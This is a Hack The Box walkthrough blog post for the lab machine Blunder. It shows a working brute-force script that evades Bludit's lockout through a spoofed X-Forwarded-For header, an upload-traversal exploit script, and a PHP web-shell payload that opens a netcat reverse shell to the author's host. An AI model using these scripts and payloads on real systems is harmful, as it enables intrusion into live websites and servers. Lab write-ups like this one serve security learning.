---
layout: post  
title: "Blunder: Hack The Box Walkthrough"
date: 2020-10-18 07:12:23 +0000
last_modified_at: 2020-10-18 07:12:23 +0000
category: Walkthrough
tags: ["Hack The Box", Blunder, retired, Linux, Easy]
comments: true
protect: false
image:
  feature: blunder-htb-walkthrough.png
---

This post documents the complete walkthrough of Blunder, a retired vulnerable [VM][1] created by [egotisticalSW][2], and hosted at [Hack The Box][3]. If you are uncomfortable with spoilers, please stop reading now.
{: .notice}

<!--more-->

## On this post
{:.no_toc}

* TOC
{:toc}

## Background

Blunder is a retired vulnerable VM from Hack The Box.

## Information Gathering

Let\'s start with a `masscan` probe to establish the open ports in the host.

```
# masscan -e tun0 -p1-65535,U:1-65535 10.10.10.191 --rate=500

Starting masscan 1.0.5 (http://bit.ly/14GZzcT) at 2020-05-31 18:24:55 GMT
 -- forced options: -sS -Pn -n --randomize-hosts -v --send-eth
Initiating SYN Stealth Scan
Scanning 1 hosts [131070 ports/host]
Discovered open port 80/tcp on 10.10.10.191
```

What??!! Only one open port. Let's do one better with `nmap` scanning the discoverd port to establish its service.

```
# nmap -n -v -Pn -p80 -A --reason 10.10.10.191 -oN nmap.txt
...
PORT   STATE SERVICE REASON         VERSION
80/tcp open  http    syn-ack ttl 63 Apache httpd 2.4.41 ((Ubuntu))
|_http-favicon: Unknown favicon MD5: A0F0E5D852F0E3783AF700B6EE9D00DA
|_http-generator: Blunder
| http-methods:
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: Apache/2.4.41 (Ubuntu)
|_http-title: Blunder | A blunder of interesting facts
```

Man, this is a shit-show. Anyways, this is what the site looks like.

{% include image.html image_alt="f2f54e62.png" image_src="/1931add6-7d26-41c0-9867-592733e4a116/f2f54e62.png" %}

### Directory/File Enumeration

Let's dump the hyperlinks of the landing page and see what we can find.

```
# curl -s 10.10.10.191 | grep -Eo '(href|src)=".*"' | sed -r 's/(href|src)=//g' | tr -d '"' | sort
http://10.10.10.191/
http://10.10.10.191/about
http://10.10.10.191/bl-kernel/css/bootstrap.min.css?version=3.9.2
http://10.10.10.191/bl-kernel/js/bootstrap.bundle.min.js?version=3.9.2
http://10.10.10.191/bl-kernel/js/jquery.min.js?version=3.9.2
http://10.10.10.191/bl-themes/blogx/css/style.css?version=3.9.2
http://10.10.10.191/bl-themes/blogx/img/favicon.png/><a target=_blank class=text-white https://www.twitter.com/WhortonMr
http://10.10.10.191/bl-themes/blogx/img/favicon.png type=image/png
http://10.10.10.191/stadia
http://10.10.10.191/stephen-king-0
http://10.10.10.191/usb
https://www.computerhope.com/history/1996.htm
```

Better play it safe and include `gobuster` and SecLists into the mix.

```
# gobuster dir -w /usr/share/seclists/Discovery/Web-Content/raft-small-directories-lowercase.txt -t 20 -e -x php,txt,json -u http://10.10.10.191/
===============================================================
Gobuster v3.0.1
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
===============================================================
[+] Url:            http://10.10.10.191/
[+] Threads:        20
[+] Wordlist:       /usr/share/seclists/Discovery/Web-Content/raft-small-directories-lowercase.txt
[+] Status codes:   200,204,301,302,307,401,403
[+] User Agent:     gobuster/3.0.1
[+] Extensions:     php,txt,json
[+] Expanded:       true
[+] Timeout:        10s
===============================================================
2020/06/01 07:52:55 Starting gobuster
===============================================================
http://10.10.10.191/admin (Status: 301)
http://10.10.10.191/install.php (Status: 200)
http://10.10.10.191/about (Status: 200)
http://10.10.10.191/0 (Status: 200)
http://10.10.10.191/robots.txt (Status: 200)
http://10.10.10.191/todo.txt (Status: 200)
http://10.10.10.191/server-status (Status: 403)
http://10.10.10.191/usb (Status: 200)
===============================================================
2020/06/01 08:19:10 Finished
===============================================================
```

`todo.txt` sure looks interesting.

{% include image.html image_alt="2ad9fed5.png" image_src="/1931add6-7d26-41c0-9867-592733e4a116/2ad9fed5.png" %}

Looks like we may have a vulnerable CMS. And who is `fergus`?

### Bludit - Flat-File CMS

A quick search for `bl-kernel` and `bl-themes` reveals the presence of the [Bludit](https://github.com/bludit/bludit) CMS, which the creator has renamed it as Blunder. This is evident in the result of the `nmap` script `http-generator` above. Interestingly, directory indexing is not disabled.

{% include image.html image_alt="5d19e5fa.png" image_src="/1931add6-7d26-41c0-9867-592733e4a116/5d19e5fa.png" %}

{% include image.html image_alt="3835d450.png" image_src="/1931add6-7d26-41c0-9867-592733e4a116/3835d450.png" %}

The GitHub repository provides a good idea what the sitemap is like. I'm especially interested in `.gitignore` to see if more directories are exposed.

```
# curl 10.10.10.191/.gitignore
.DS_Store
dbgenerator.php
bl-content/*
bl-content-migrator
bl-plugins/timemachine
bl-plugins/timemachine-x
bl-plugins/discovery
bl-plugins/updater
bl-plugins/medium-editor
bl-plugins/quill
bl-plugins/yandex-metrica/
bl-plugins/domain-migrator/
bl-plugins/tail-writer/
bl-kernel/bludit.pro.php
bl-kernel/admin/themes/gris
bl-themes/docs
bl-themes/docsx
bl-themes/editorial
bl-themes/mediumish
bl-themes/clean-blog
bl-themes/grayscale
bl-themes/massively
bl-themes/hyperspace
bl-themes/striped
bl-themes/log
bl-themes/micro
bl-themes/tagg
bl-themes/future-imperfect
```

`bl-content` should be interesting.

{% include image.html image_alt="64731460.png" image_src="/1931add6-7d26-41c0-9867-592733e4a116/64731460.png" %}

### Breaking Bludit Authentication

According to the documenation, the user `admin` is first created on installation via `install.php`. Subsequently, the `admin` is free to create other users. The authentication mechanism seems pretty water tight to me and since it doesn't store the hashed password in a database, but rather in a flat file, bypassing authentication through SQL injection is not possible. We need to find another way. The tried-and-tested way is by brute-force.

To that end, I wrote the following shell script, with `curl` as the main driver and GNU Parallel to run jobs in parallel.

<div class="filename"><span>brute.sh</span></div>

```bash
#!/bin/bash

USER=$1
PASS=$2
THREAD=$3

function die() {
    killall perl 2>/dev/null
}

export -f die

function check() {

    local HOST=10.10.10.191
    local COOKIE=$(mktemp -u)
    local USER=$1
    local PASS=$2

    # get CSRF token
    CSRF=$(curl -s \
                -c $COOKIE \
                "http://$HOST/admin/" \
           | grep 'tokenCSRF' \
           | grep -Eo 'value=".*"' \
           | sed -r 's/value=//g' \
           | tr -d '"')

    # login attempt
    CODE=$(curl -s \
                -b $COOKIE \
                -d "tokenCSRF=$CSRF&username=$USER&password=$PASS&save=" \
                -H "X-Forwarded-For: 10.10.16.$(($RANDOM % 255))" \
                -w "%{http_code}" \
                -o /dev/null \
                "http://$HOST/admin/")

    if [ $CODE -ne 200 ]; then
        echo "[+] User is $USER, Password is $PASS"
        die
    fi

    rm -f $COOKIE
}

export -f check

parallel -q -j$THREAD check ::: $USER :::: $PASS
```

The script takes in three arguments: (1) the username, (2) the password list, and (3) the number of jobs to run in parallel. The password list is generated from `cewl`.

{% include image.html image_alt="9d01158b.png" image_src="/1931add6-7d26-41c0-9867-592733e4a116/9d01158b.png" %}

Turns out that `fergus` is the username and the password is `RolandDeschain`. One more thing. Bludit has brute-force protection but it can be easily bypassed with a header like `X-Forwarded-For`. Check out this line.

```
-H "X-Forwarded-For: 10.10.16.$(($RANDOM % 255))"
```

I had `bash` generate a different last octet of the client IP address. Bludit took it in like a champion.

{% include image.html image_alt="8bd22e28.png" image_src="/1931add6-7d26-41c0-9867-592733e4a116/8bd22e28.png" %}

Boom!

### Remote Code Execution in Bludit < 3.9.2

On to the main event—getting that initial foothold. There's a remote code execution vulnerability in Bludit 3.9.2 as reported in [#1081](https://github.com/bludit/bludit/issues/1081). I wrote this exploit following that.

<div class="filename"><span>exploit.sh</span></div>

```bash
#!/bin/bash

HOST=10.10.10.191
COOKIE=$(mktemp -u)
PROXY=127.0.0.1:8080
USER=fergus
PASS=RolandDeschain
FILE=$1

function get() {
    local BODY="$1"
    local WHAT=$2
    local VALUE=$(echo "$BODY" \
                  | grep -Eo "name=\"$WHAT\" value=\"[0-9a-f]+\"" \
                  | cut -d ' ' -f2 \
                  | sed -r 's/value=//g' \
                  | tr -d '"')
    echo $VALUE
}

function login() {
    local BODY="$(curl -s -c $COOKIE http://$HOST/admin/)"

    # get CSRF token
    local CSRF=$(get "$BODY" "tokenCSRF")

    # login attempt
    CODE=$(curl -s \
                -b $COOKIE \
                -d "tokenCSRF=$CSRF&username=$USER&password=$PASS&save=" \
                -w "%{http_code}" \
                -o /dev/null \
                "http://$HOST/admin/")
}

function exploit() {
    login $USER $PASS
    local FILE=$1
    local BODY="$(curl -s -b $COOKIE http://$HOST/admin/edit-content/blender)"
    local CSRF=$(get "$BODY" "tokenCSRF");
    local UUID=$(get "$BODY" "uuid");
    curl -s \
         -b $COOKIE \
         -F "images[]=@$FILE;type=image/jpeg;filename=${FILE%.*}.jpg" \
         -F "uuid=../../tmp/temp" \
         -F "tokenCSRF=$CSRF" \
         -o /dev/null \
         http://$HOST/admin/ajax/upload-images
    curl -s \
         -b $COOKIE \
         -F "images[]=@htaccess.jpg;type=image/jpeg;filename=.htaccess" \
         -F "uuid=$UUID" \
         -F "tokenCSRF=$CSRF" \
         -o /dev/null \
         http://$HOST/admin/ajax/upload-images
    curl -s \
         -b $COOKIE \
         http://$HOST/bl-content/tmp/temp/${FILE%.*}.jpg
}

exploit $FILE
echo "[+] Written to http://$HOST/bl-content/uploads/$FILE"

# clean up
rm -f $COOKIE
```

This exploit takes in one argument: the PHP file to write to `/bl-content/uploads` while `.htaccess` is hardcoded in `htaccess.jpg`.

<div class="filename"><span>htaccess.jpg</span></div>

```
RewriteEngine off
AddType application/x-httpd-php .jpg
```

## Low-Privilege Shell

I'm going to use the exploit to run a reverse shell back.

<div class="filename"><span>shell.php</span></div>

```php
<?php file_put_contents("../../uploads/shell.php","<?php echo shell_exec('rm -rf /tmp/p; mkfifo /tmp/p; /bin/bash </tmp/p | /bin/nc 10.10.16.47 1234 >/tmp/p'); ?>"); ?>
```

{% include image.html image_alt="91669376.png" image_src="/1931add6-7d26-41c0-9867-592733e4a116/91669376.png" %}

Meanwhile the reverse shell appears on my `netcat` listener.

{% include image.html image_alt="3e942671.png" image_src="/1931add6-7d26-41c0-9867-592733e4a116/3e942671.png" %}

### Going from `www-data` to `hugo`

During enumeration of `www-data`, I notice there is another Bludit installation at `/var/www/bludit-3.10.0a`. This corroborates with what was described in `todo.txt`. The file `users.php` in `/bl-content/databases/` contains the password hash of `hugo`.

<div class="filename"><span>users.php</span></div>

```
<?php defined('BLUDIT') or die('Bludit CMS.'); ?>
{
    "admin": {
        "nickname": "Hugo",
        "firstName": "Hugo",
        "lastName": "",
        "role": "User",
        "password": "faca404fd5c0a31cf1897b823c695c85cffeb98d",
        "email": "",
        "registered": "2019-11-27 07:40:55",
        "tokenRemember": "",
        "tokenAuth": "b380cb62057e9da47afce66b4615107d",
        "tokenAuthTTL": "2009-03-15 14:00",
        "twitter": "",
        "facebook": "",
        "instagram": "",
        "codepen": "",
        "linkedin": "",
        "github": "",
        "gitlab": ""}
}
```

Hmm, no salt??!! Raw SHA1 hash it is then. A search [online](https://crackstation.net/) for the hash reveals the password to be `Password120`. Let's see if we can `su` to `hugo` with that password.

{% include image.html image_alt="72526352.png" image_src="/1931add6-7d26-41c0-9867-592733e4a116/72526352.png" %}

Sweet. The file `user.txt` is at `hugo`'s home directory.

{% include image.html image_alt="5d61d332.png" image_src="/1931add6-7d26-41c0-9867-592733e4a116/5d61d332.png" %}

## Privilege Escalation

During enumeration of `hugo`'s account, I notice that `hugo` can `sudo /bin/bash` as long as the user is not `root`.

{% include image.html image_alt="3c8c06eb.png" image_src="/1931add6-7d26-41c0-9867-592733e4a116/3c8c06eb.png" %}

On top of that, the `sudo` installed is vulnerable to EDB-ID [47502](https://www.exploit-db.com/exploits/47502). With that, we can easily bypass `sudoer` policy like so.

{% include image.html image_alt="c0695409.png" image_src="/1931add6-7d26-41c0-9867-592733e4a116/c0695409.png" %}

The end is here.

{% include image.html image_alt="79fb3697.png" image_src="/1931add6-7d26-41c0-9867-592733e4a116/79fb3697.png" %}

:dancer:

*[CMS]:Content Management System

[1]: https://www.hackthebox.eu/home/machines/profile/254
[2]: https://www.hackthebox.eu/home/users/profile/94858
[3]: https://www.hackthebox.eu/
